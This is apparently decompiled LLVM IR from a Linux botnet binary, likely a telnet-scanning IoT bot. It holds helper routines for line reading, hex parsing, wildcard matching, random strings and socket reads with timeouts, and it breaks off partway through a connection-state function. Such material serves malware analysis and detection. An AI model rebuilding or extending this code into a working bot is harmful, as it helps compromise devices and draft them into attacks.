define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048d40

dec_label_pc_8048d17:                             ; preds = %dec_label_pc_8048d48
  %v3_8048d2f = inttoptr i32 %v5_8048d4b to i32*
  %v4_8048d2f = call i32 @__libc_read(i32 %arg3, i32* %v3_8048d2f, i32 1)
  %v4_8048d37 = add nuw i32 %storemerge113, 1
  %v8_8048d3a = icmp eq i32 %v4_8048d2f, 0
  %v12_8048d3a = icmp eq i32 %v4_8048d2f, 1
  %v1_8048d3e = icmp eq i1 %v12_8048d3a, false
  br i1 %v1_8048d3e, label %dec_label_pc_8048d56, label %dec_label_pc_8048d40

dec_label_pc_8048d40:                             ; preds = %entry, %dec_label_pc_8048d17
  %v8_8048d3a14 = phi i1 [ false, %entry ], [ %v8_8048d3a, %dec_label_pc_8048d17 ]
  %storemerge113 = phi i32 [ 0, %entry ], [ %v4_8048d37, %dec_label_pc_8048d17 ]
  %v5_8048d46 = icmp slt i32 %storemerge113, %arg2
  br i1 %v5_8048d46, label %dec_label_pc_8048d48, label %dec_label_pc_8048d56

dec_label_pc_8048d48:                             ; preds = %dec_label_pc_8048d40
  %v5_8048d4b = add i32 %storemerge113, %arg1
  %v1_8048d4e = add i32 %v5_8048d4b, -1
  %v1_8048d4f = inttoptr i32 %v1_8048d4e to i8*
  %v2_8048d4f = load i8, i8* %v1_8048d4f, align 1
  %v10_8048d52 = icmp eq i8 %v2_8048d4f, 10
  %v1_8048d54 = icmp eq i1 %v10_8048d52, false
  br i1 %v1_8048d54, label %dec_label_pc_8048d17, label %dec_label_pc_8048d56

dec_label_pc_8048d56:                             ; preds = %dec_label_pc_8048d40, %dec_label_pc_8048d48, %dec_label_pc_8048d17
  %v8_8048d3a.lcssa = phi i1 [ %v8_8048d3a14, %dec_label_pc_8048d40 ], [ %v8_8048d3a14, %dec_label_pc_8048d48 ], [ %v8_8048d3a, %dec_label_pc_8048d17 ]
  br i1 %v8_8048d3a.lcssa, label %dec_label_pc_8048d6b, label %dec_label_pc_8048d5c

dec_label_pc_8048d5c:                             ; preds = %dec_label_pc_8048d56
  br label %dec_label_pc_8048d6b

dec_label_pc_8048d6b:                             ; preds = %dec_label_pc_8048d56, %dec_label_pc_8048d5c
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048d5c ], [ 0, %dec_label_pc_8048d56 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048d4b, { 1, 0 }
  uselistorder i32 %storemerge113, { 2, 0, 1 }
  uselistorder i1 %v8_8048d3a14, { 1, 0 }
  uselistorder i1 %v8_8048d3a, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048d6b, { 1, 0 }
  uselistorder label %dec_label_pc_8048d56, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048d40, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048d9f1 = ptrtoint i8* %arg1 to i32
  %v2_8048da22 = load i8, i8* %arg1, align 1
  %v4_8048da54 = icmp eq i8 %v2_8048da22, 0
  br i1 %v4_8048da54, label %dec_label_pc_8048daf, label %dec_label_pc_8048da9

dec_label_pc_8048d7f:                             ; preds = %dec_label_pc_8048da9
  %v2_8048d84 = mul i32 %stack_var_-8.010, 16
  %v2_8048d8a = load i8, i8* %stack_var_4.011, align 1
  %v3_8048d8a = zext i8 %v2_8048d8a to i32
  %v1_8048d90 = mul nuw nsw i32 %v3_8048d8a, 4
  %v2_8048d90 = add i32 %v1_8048d90, ptrtoint (i32* @global_var_8055900.17 to i32)
  %v3_8048d90 = inttoptr i32 %v2_8048d90 to i32*
  %v4_8048d90 = load i32, i32* %v3_8048d90, align 4
  %v2_8048d97 = or i32 %v4_8048d90, %v2_8048d84
  %v5_8048d9c = add i32 %v4_8048d9f12, 1
  %v22_8048d9c = inttoptr i32 %v5_8048d9c to i8*
  %v2_8048da2 = load i8, i8* %v22_8048d9c, align 1
  %v4_8048da5 = icmp eq i8 %v2_8048da2, 0
  br i1 %v4_8048da5, label %dec_label_pc_8048daf, label %dec_label_pc_8048da9

dec_label_pc_8048da9:                             ; preds = %entry, %dec_label_pc_8048d7f
  %v4_8048d9f12 = phi i32 [ %v5_8048d9c, %dec_label_pc_8048d7f ], [ %v4_8048d9f1, %entry ]
  %stack_var_4.011 = phi i8* [ %v22_8048d9c, %dec_label_pc_8048d7f ], [ %arg1, %entry ]
  %stack_var_-8.010 = phi i32 [ %v2_8048d97, %dec_label_pc_8048d7f ], [ 0, %entry ]
  %v5_8048da9 = icmp slt i32 %stack_var_-8.010, 0
  %v1_8048dad = icmp eq i1 %v5_8048da9, false
  br i1 %v1_8048dad, label %dec_label_pc_8048d7f, label %dec_label_pc_8048daf

dec_label_pc_8048daf:                             ; preds = %dec_label_pc_8048d7f, %dec_label_pc_8048da9, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %v2_8048d97, %dec_label_pc_8048d7f ], [ %stack_var_-8.010, %dec_label_pc_8048da9 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.010, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048daf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048da9, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp13 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048db7 = load i32, i32* @ebx, align 4
  store i32 %v0_8048db7, i32* %stack_var_-8, align 4
  %v4_8048dbb = ptrtoint i8* %arg1 to i32
  %v2_8048dbe = load i8, i8* %arg1, align 1
  %v12_8048dc7 = icmp eq i8 %v2_8048dbe, 42
  br i1 %v12_8048dc7, label %dec_label_pc_8048def, label %dec_label_pc_8048dcd

dec_label_pc_8048dcd:                             ; preds = %entry
  %v12_8048dcd = icmp eq i8 %v2_8048dbe, 63
  br i1 %v12_8048dcd, label %dec_label_pc_8048e42, label %dec_label_pc_8048dd3

dec_label_pc_8048dd3:                             ; preds = %dec_label_pc_8048dcd
  %v4_8048dd3 = icmp eq i8 %v2_8048dbe, 0
  br i1 %v4_8048dd3, label %dec_label_pc_8048dde, label %dec_label_pc_8048e7c

dec_label_pc_8048dde:                             ; preds = %dec_label_pc_8048dd3
  %v2_8048de1 = load i8, i8* %tmp13, align 1
  %v3_8048de1 = zext i8 %v2_8048de1 to i32
  br label %dec_label_pc_8048ed2

dec_label_pc_8048def:                             ; preds = %entry
  %v1_8048df2 = add i32 %v4_8048dbb, 1
  %v4_8048dfa = inttoptr i32 %v1_8048df2 to i8*
  %v5_8048dfd = call i32 @wildString(i8* %v4_8048dfa, i32 %arg2)
  %v1_8048e02 = icmp eq i32 %v5_8048dfd, 0
  br i1 %v1_8048e02, label %dec_label_pc_8048e30, label %dec_label_pc_8048e06

dec_label_pc_8048e06:                             ; preds = %dec_label_pc_8048def
  %v2_8048e09 = load i8, i8* %tmp13, align 1
  %v4_8048e0c = icmp eq i8 %v2_8048e09, 0
  br i1 %v4_8048e0c, label %dec_label_pc_8048e37, label %dec_label_pc_8048e10

dec_label_pc_8048e10:                             ; preds = %dec_label_pc_8048e06
  %v1_8048e13 = add i32 %arg2, 1
  %v5_8048e1e = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048e13)
  %v1_8048e23 = icmp eq i32 %v5_8048e1e, 0
  br i1 %v1_8048e23, label %dec_label_pc_8048e30, label %dec_label_pc_8048e37

dec_label_pc_8048e30:                             ; preds = %dec_label_pc_8048e10, %dec_label_pc_8048def
  br label %dec_label_pc_8048e37

dec_label_pc_8048e37:                             ; preds = %dec_label_pc_8048e06, %dec_label_pc_8048e10, %dec_label_pc_8048e30
  %storemerge6 = phi i32 [ 0, %dec_label_pc_8048e30 ], [ 1, %dec_label_pc_8048e10 ], [ 1, %dec_label_pc_8048e06 ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048e42:                             ; preds = %dec_label_pc_8048dcd
  %v2_8048e45 = load i8, i8* %tmp13, align 1
  %v4_8048e48 = icmp eq i8 %v2_8048e45, 0
  br i1 %v4_8048e48, label %dec_label_pc_8048e74, label %dec_label_pc_8048e4c

dec_label_pc_8048e4c:                             ; preds = %dec_label_pc_8048e42
  %v1_8048e4f = add i32 %arg2, 1
  %v1_8048e53 = add i32 %v4_8048dbb, 1
  %v4_8048e58 = inttoptr i32 %v1_8048e53 to i8*
  %v5_8048e5b = call i32 @wildString(i8* %v4_8048e58, i32 %v1_8048e4f)
  %v1_8048e60 = icmp ne i32 %v5_8048e5b, 0
  %. = zext i1 %v1_8048e60 to i32
  br label %dec_label_pc_8048e74

dec_label_pc_8048e74:                             ; preds = %dec_label_pc_8048e4c, %dec_label_pc_8048e42
  %storemerge5 = phi i32 [ 1, %dec_label_pc_8048e42 ], [ %., %dec_label_pc_8048e4c ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048e7c:                             ; preds = %dec_label_pc_8048dd3
  %v2_8048e7f = load i8, i8* %arg1, align 1
  %v3_8048e7f = zext i8 %v2_8048e7f to i32
  %v2_8048e88 = call i32 @__GI_toupper(i32 %v3_8048e7f)
  store i32 %v2_8048e88, i32* @ebx, align 4
  %v2_8048e92 = load i8, i8* %tmp13, align 1
  %v3_8048e92 = zext i8 %v2_8048e92 to i32
  %v2_8048e9b = call i32 @__GI_toupper(i32 %v3_8048e92)
  %v0_8048ea0 = load i32, i32* @ebx, align 4
  %v12_8048ea0 = icmp eq i32 %v0_8048ea0, %v2_8048e9b
  %v1_8048ea2 = icmp eq i1 %v12_8048ea0, false
  br i1 %v1_8048ea2, label %dec_label_pc_8048ecc, label %dec_label_pc_8048ea4

dec_label_pc_8048ea4:                             ; preds = %dec_label_pc_8048e7c
  %v1_8048ea7 = add i32 %arg2, 1
  %v1_8048eab = add i32 %v4_8048dbb, 1
  %v4_8048eb0 = inttoptr i32 %v1_8048eab to i8*
  %v5_8048eb3 = call i32 @wildString(i8* %v4_8048eb0, i32 %v1_8048ea7)
  %v1_8048eb8 = icmp ne i32 %v5_8048eb3, 0
  %.7 = zext i1 %v1_8048eb8 to i32
  br label %dec_label_pc_8048ecc

dec_label_pc_8048ecc:                             ; preds = %dec_label_pc_8048ea4, %dec_label_pc_8048e7c
  %storemerge = phi i32 [ 1, %dec_label_pc_8048e7c ], [ %.7, %dec_label_pc_8048ea4 ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048ed2:                             ; preds = %dec_label_pc_8048e74, %dec_label_pc_8048e37, %dec_label_pc_8048dde, %dec_label_pc_8048ecc
  %stack_var_-24.0 = phi i32 [ %storemerge6, %dec_label_pc_8048e37 ], [ %storemerge5, %dec_label_pc_8048e74 ], [ %v3_8048de1, %dec_label_pc_8048dde ], [ %storemerge, %dec_label_pc_8048ecc ]
  %v2_8048ed8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048ed8, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048dbe, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048ed2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048e37, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_8048edb = load i32, i32* @ebp, align 4
  %v1_8048ee7 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048ee7, i32* %arg2, align 4
  %v10_8048ef8 = icmp eq i32 %v1_8048ee7, -1
  %. = zext i1 %v10_8048ef8 to i32
  store i32 %v0_8048edb, i32* @ebp, align 4
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048f354 = ptrtoint i8* %arg1 to i32
  %v2_8048f385 = load i8, i8* %arg1, align 1
  %v4_8048f3b7 = icmp eq i8 %v2_8048f385, 0
  %v1_8048f3d9 = icmp eq i1 %v4_8048f3b7, false
  br i1 %v1_8048f3d9, label %dec_label_pc_8048f1a, label %dec_label_pc_8048f3f

dec_label_pc_8048f1a:                             ; preds = %entry, %dec_label_pc_8048f1a
  %v4_8048f3511 = phi i32 [ %v5_8048f32, %dec_label_pc_8048f1a ], [ %v4_8048f354, %entry ]
  %stack_var_4.010 = phi i8* [ %v22_8048f32, %dec_label_pc_8048f1a ], [ %arg1, %entry ]
  %v2_8048f1d = load i8, i8* %stack_var_4.010, align 1
  %v3_8048f1d = zext i8 %v2_8048f1d to i32
  %v1_8048f26 = call i32 @__GI_toupper(i32 %v3_8048f1d)
  %v1_8048f30 = trunc i32 %v1_8048f26 to i8
  store i8 %v1_8048f30, i8* %stack_var_4.010, align 1
  %v5_8048f32 = add i32 %v4_8048f3511, 1
  %v22_8048f32 = inttoptr i32 %v5_8048f32 to i8*
  %v2_8048f38 = load i8, i8* %v22_8048f32, align 1
  %v4_8048f3b = icmp eq i8 %v2_8048f38, 0
  %v1_8048f3d = icmp eq i1 %v4_8048f3b, false
  br i1 %v1_8048f3d, label %dec_label_pc_8048f1a, label %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge

dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge: ; preds = %dec_label_pc_8048f1a
  br label %dec_label_pc_8048f3f

dec_label_pc_8048f3f:                             ; preds = %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge, %entry
  %v3_8048f38.lcssa.in = phi i8 [ %v2_8048f38, %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge ], [ %v2_8048f385, %entry ]
  %v3_8048f38.lcssa = zext i8 %v3_8048f38.lcssa.in to i32
  ret i32 %v3_8048f38.lcssa

; uselistorder directives
  uselistorder i8* %v22_8048f32, { 1, 0 }
  uselistorder i32 %v5_8048f32, { 1, 0 }
  uselistorder i8* %stack_var_4.010, { 1, 0 }
  uselistorder label %dec_label_pc_8048f1a, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048f41 = load i32, i32* @ebp, align 4
  store i32 %v0_8048f41, i32* %stack_var_-4, align 4
  %v0_8048f44 = load i32, i32* @ebx, align 4
  store i32 %v0_8048f44, i32* %stack_var_-8, align 4
  %v5_8048f5d = ptrtoint i8* %arg1 to i32
  %v5_8048fa325 = icmp sgt i32 %arg2, 0
  br i1 %v5_8048fa325, label %dec_label_pc_8048f58, label %dec_label_pc_8048fa5

dec_label_pc_8048f58:                             ; preds = %entry, %dec_label_pc_8048f58
  %storemerge26 = phi i32 [ %v4_8048f9a, %dec_label_pc_8048f58 ], [ 0, %entry ]
  %v6_8048f5d = add i32 %storemerge26, %v5_8048f5d
  store i32 %v6_8048f5d, i32* @ebx, align 4
  %v1_8048f60 = call i32 @rand_cmwc(i32 %storemerge26)
  %v2_8048f75 = udiv i32 %v1_8048f60, 26
  %tmp = mul i32 %v2_8048f75, -10
  %v2_8048f8d = add i32 %v1_8048f60, %tmp
  %v14_8048f8d = trunc i32 %v2_8048f8d to i8
  %v2_8048f96 = add i8 %v14_8048f8d, 65
  %v2_8048f98 = load i32, i32* @ebx, align 4
  %v3_8048f98 = inttoptr i32 %v2_8048f98 to i8*
  store i8 %v2_8048f96, i8* %v3_8048f98, align 1
  %v4_8048f9a = add nuw nsw i32 %storemerge26, 1
  %exitcond = icmp eq i32 %v4_8048f9a, %arg2
  br i1 %exitcond, label %dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge, label %dec_label_pc_8048f58

dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge: ; preds = %dec_label_pc_8048f58
  %v2_8048fa8.pre = load i32, i32* %stack_var_-8, align 4
  %v2_8048fa9.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048fa5

dec_label_pc_8048fa5:                             ; preds = %dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge, %entry
  %v2_8048fa9 = phi i32 [ %v2_8048fa9.pre, %dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge ], [ %v0_8048f41, %entry ]
  %v2_8048fa8 = phi i32 [ %v2_8048fa8.pre, %dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge ], [ %v0_8048f44, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge ], [ 0, %entry ]
  store i32 %v2_8048fa8, i32* @ebx, align 4
  store i32 %v2_8048fa9, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048f9a, { 1, 0 }
  uselistorder i32 %storemerge26, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048f58, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048fae = load i32, i32* @edi, align 4
  store i32 %v0_8048fae, i32* %stack_var_-8, align 4
  %v4_8048fb8 = ptrtoint i8* %arg2 to i32
  %v1_8048fc0 = and i32 %v4_8048fb8, -256
  %v5_8048fc2 = call i8* @_memset(i8* %arg2, i32 %v1_8048fc0, i32 %arg3)
  store i32 30, i32* %stack_var_-176, align 4
  %v2_8048fe2 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i1 false, i1* @df, align 1
  %v5_8048fe9 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_8048ff6 = udiv i32 %arg1, 32
  %v1_8048ffc = urem i32 %arg1, 32
  %v0_8048fff = load i32, i32* @ebp, align 4
  %v2_8048fff = mul nuw nsw i32 %v2_8048ff6, 4
  %v3_8048fff = add nsw i32 %v2_8048fff, -164
  %v4_8048fff = add i32 %v3_8048fff, %v0_8048fff
  %v5_8048fff = inttoptr i32 %v4_8048fff to i32*
  %v6_8048fff = load i32, i32* %v5_8048fff, align 4
  %v9_8048fff = shl i32 1, %v1_8048ffc
  %v12_8048fff = or i32 %v6_8048fff, %v9_8048fff
  store i32 %v12_8048fff, i32* %v5_8048fff, align 4
  %v1_804900a = add i32 %arg1, 1
  %v2_804900b = ptrtoint i32* %stack_var_-176 to i32
  %v5_8049034 = call i32 @__libc_select(i32 %v1_804900a, i32 %v2_8048fe2, i32 0, i32 %v2_8048fe2, i32 %v2_804900b)
  %tmp33 = icmp slt i32 %v5_8049034, 1
  %tmp34 = icmp eq i1 %tmp33, false
  br i1 %tmp34, label %dec_label_pc_80490d6, label %dec_label_pc_80490cc.preheader

dec_label_pc_80490cc.preheader:                   ; preds = %entry
  %v7_80490d046 = icmp sgt i32 %tmp11, 9
  br i1 %v7_80490d046, label %dec_label_pc_80490d6, label %dec_label_pc_804904b

dec_label_pc_804904b:                             ; preds = %dec_label_pc_80490cc.preheader, %dec_label_pc_80490c9
  %stack_var_-36.047 = phi i32 [ %v4_80490c9, %dec_label_pc_80490c9 ], [ %tmp11, %dec_label_pc_80490cc.preheader ]
  store i32 30, i32* %stack_var_-176, align 4
  store i1 false, i1* @df, align 1
  %v5_8049070 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v0_8049086 = load i32, i32* @ebp, align 4
  %v4_8049086 = add i32 %v3_8048fff, %v0_8049086
  %v5_8049086 = inttoptr i32 %v4_8049086 to i32*
  %v6_8049086 = load i32, i32* %v5_8049086, align 4
  %v12_8049086 = or i32 %v6_8049086, %v9_8048fff
  store i32 %v12_8049086, i32* %v5_8049086, align 4
  %v5_80490bb = call i32 @__libc_select(i32 %v1_804900a, i32 %v2_8048fe2, i32 0, i32 %v2_8048fe2, i32 %v2_804900b)
  %tmp35 = icmp slt i32 %v5_80490bb, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br i1 %tmp36, label %dec_label_pc_80490d6, label %dec_label_pc_80490c9

dec_label_pc_80490c9:                             ; preds = %dec_label_pc_804904b
  %v4_80490c9 = add nsw i32 %stack_var_-36.047, 1
  %v7_80490d0 = icmp sgt i32 %stack_var_-36.047, 8
  br i1 %v7_80490d0, label %dec_label_pc_80490d6, label %dec_label_pc_804904b

dec_label_pc_80490d6:                             ; preds = %dec_label_pc_80490cc.preheader, %dec_label_pc_804904b, %dec_label_pc_80490c9, %entry
  %v2_80490fa = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_8049140

dec_label_pc_80490e5:                             ; preds = %dec_label_pc_8049140
  %v0_80490e5 = load i32, i32* @global_var_80584c0.18, align 64
  %v4_8049107 = call i32 @__libc_recv(i32 %v0_80490e5, i32 %v2_80490fa, i32 1, i32 0)
  %v9_804910c = icmp eq i32 %v4_8049107, 1
  br i1 %v9_804910c, label %dec_label_pc_8049123, label %dec_label_pc_8049111

dec_label_pc_8049111:                             ; preds = %dec_label_pc_80490e5
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_804915d

dec_label_pc_8049123:                             ; preds = %dec_label_pc_80490e5
  %v3_8049123 = load i8, i8* %stack_var_-177, align 1
  %v4_804912a = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_8049123, i8* %stack_var_-32.0, align 1
  %v5_804912f = add i32 %v4_804912a, 1
  %v22_804912f = inttoptr i32 %v5_804912f to i8*
  %v3_8049132 = load i8, i8* %stack_var_-177, align 1
  %v10_8049139 = icmp eq i8 %v3_8049132, 10
  br i1 %v10_8049139, label %dec_label_pc_804914e, label %dec_label_pc_804913d

dec_label_pc_804913d:                             ; preds = %dec_label_pc_8049123
  %v4_804913d = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8049140

dec_label_pc_8049140:                             ; preds = %dec_label_pc_80490d6, %dec_label_pc_804913d
  %stack_var_-32.0 = phi i8* [ %arg2, %dec_label_pc_80490d6 ], [ %v22_804912f, %dec_label_pc_804913d ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_80490d6 ], [ %v4_804913d, %dec_label_pc_804913d ]
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_80490d6 ], [ %v4_8049140, %dec_label_pc_804913d ]
  %v4_8049140 = add i32 %stack_var_12.0, -1
  %v9_8049140 = sub i32 0, %stack_var_12.0
  %v10_8049140 = and i32 %stack_var_12.0, %v9_8049140
  %v11_8049140 = icmp slt i32 %v10_8049140, 0
  %v12_8049140 = icmp eq i32 %v4_8049140, 0
  %v13_8049140 = icmp slt i32 %v4_8049140, 0
  %v3_8049144 = icmp eq i1 %v13_8049140, %v11_8049140
  %v4_8049144 = icmp eq i1 %v12_8049140, false
  %v5_8049144 = and i1 %v4_8049144, %v3_8049144
  %v4_804914a = icmp eq i1 %v5_8049144, false
  %v1_804914c = icmp eq i1 %v4_804914a, false
  br i1 %v1_804914c, label %dec_label_pc_80490e5, label %dec_label_pc_804914e

dec_label_pc_804914e:                             ; preds = %dec_label_pc_8049123, %dec_label_pc_8049140
  %stack_var_-32.1 = phi i8* [ %v22_804912f, %dec_label_pc_8049123 ], [ %stack_var_-32.0, %dec_label_pc_8049140 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  br label %dec_label_pc_804915d

dec_label_pc_804915d:                             ; preds = %dec_label_pc_8049111, %dec_label_pc_804914e
  %storemerge = phi i32 [ -1, %dec_label_pc_8049111 ], [ %stack_var_-28.0, %dec_label_pc_804914e ]
  %v2_8049169 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049169, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049140, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 2, 3 }
  uselistorder i8* %v22_804912f, { 1, 0 }
  uselistorder i32 %v2_8048fe2, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804915d, { 1, 0 }
  uselistorder label %dec_label_pc_804914e, { 1, 0 }
  uselistorder label %dec_label_pc_8049140, { 1, 0 }
  uselistorder label %dec_label_pc_80490d6, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804904b, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v0_804916c = load i32, i32* @ebp, align 4
  %v1_8049175 = add i32 %tmp1, 4
  %v2_8049175 = inttoptr i32 %v1_8049175 to i32*
  %v3_8049175 = load i32, i32* %v2_8049175, align 4
  %v1_8049181 = call i32 @__GI_inet_ntoa(i32 %v3_8049175)
  store i32 %v0_804916c, i32* @ebp, align 4
  ret i32 %v1_8049181
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804918b = load i32, i32* @edi, align 4
  store i32 %v0_804918b, i32* %stack_var_-8, align 4
  %v1_8049195 = inttoptr i32 %tmp8 to i8*
  store i32 %tmp8, i32* @edi, align 4
  %v1_804919a = and i32 %tmp8, -256
  %v5_804919c = call i8* @_memset(i8* %v1_8049195, i32 %v1_804919a, i32 %tmp9)
  %v4_80491b9 = call i32 @read_with_timeout(i32 %arg1, i32 %tmp5, i32 %tmp8, i32 %tmp9)
  %v2_80491ce = inttoptr i32 %tmp1 to i32*
  %v3_80491ce = call i32 @contains_string(i32 %tmp8, i32* %v2_80491ce)
  %v1_80491d3 = icmp ne i32 %v3_80491ce, 0
  %storemerge = zext i1 %v1_80491d3 to i32
  %v2_80491ed = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80491ed, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp8, { 4, 3, 0, 2, 1 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_8049217 = ptrtoint i32* %stack_var_-144 to i32
  %tmp18 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_804921e = call i8* @_memset(i8* %tmp18, i32 0, i32 32)
  %v2_804922b = udiv i32 %arg1, 32
  %v1_8049231 = urem i32 %arg1, 32
  %v0_8049234 = load i32, i32* @ebp, align 4
  %v2_8049234 = mul nuw nsw i32 %v2_804922b, 4
  %v3_8049234 = add nsw i32 %v2_8049234, -140
  %v4_8049234 = add i32 %v3_8049234, %v0_8049234
  %v5_8049234 = inttoptr i32 %v4_8049234 to i32*
  %v6_8049234 = load i32, i32* %v5_8049234, align 4
  %v9_8049234 = shl i32 1, %v1_8049231
  %v12_8049234 = or i32 %v6_8049234, %v9_8049234
  store i32 %v12_8049234, i32* %v5_8049234, align 4
  %v1_804923f = add i32 %arg1, 1
  %v4_8049246 = ptrtoint i32* %stack_var_-152 to i32
  %v5_8049267 = call i32 @__libc_select(i32 %v1_804923f, i32 %v2_8049217, i32 0, i32 0, i32 %v4_8049246)
  %tmp19 = icmp slt i32 %v5_8049267, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_804927c, label %dec_label_pc_80492a3

dec_label_pc_804927c:                             ; preds = %entry
  %v4_8049298 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_80492a3

dec_label_pc_80492a3:                             ; preds = %entry, %dec_label_pc_804927c
  %storemerge = phi i32 [ %v4_8049298, %dec_label_pc_804927c ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80492a3, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v4_80492b8 = icmp eq i32 %arg2, 0
  %v6_80492b8 = trunc i32 %arg2 to i8
  %v1_80492bc = icmp eq i1 %v4_80492b8, false
  br i1 %v1_80492bc, label %dec_label_pc_80492cb, label %dec_label_pc_80492be

dec_label_pc_80492be:                             ; preds = %entry
  %v2_80492c1 = load i32, i32* %arg1, align 4
  %v1_80492c6 = call i32 @__libc_close(i32 %v2_80492c1)
  br label %dec_label_pc_80492cb

dec_label_pc_80492cb:                             ; preds = %entry, %dec_label_pc_80492be
  %v1_80492ce = add i32 %tmp3, 16
  %v2_80492ce = inttoptr i32 %v1_80492ce to i32*
  store i32 0, i32* %v2_80492ce, align 4
  %v3_80492dd = add i32 %tmp3, 8
  %v4_80492dd = inttoptr i32 %v3_80492dd to i8*
  store i8 %v6_80492b8, i8* %v4_80492dd, align 1
  %v1_80492e3 = add i32 %tmp3, 24
  %v2_80492e3 = inttoptr i32 %v1_80492e3 to i32*
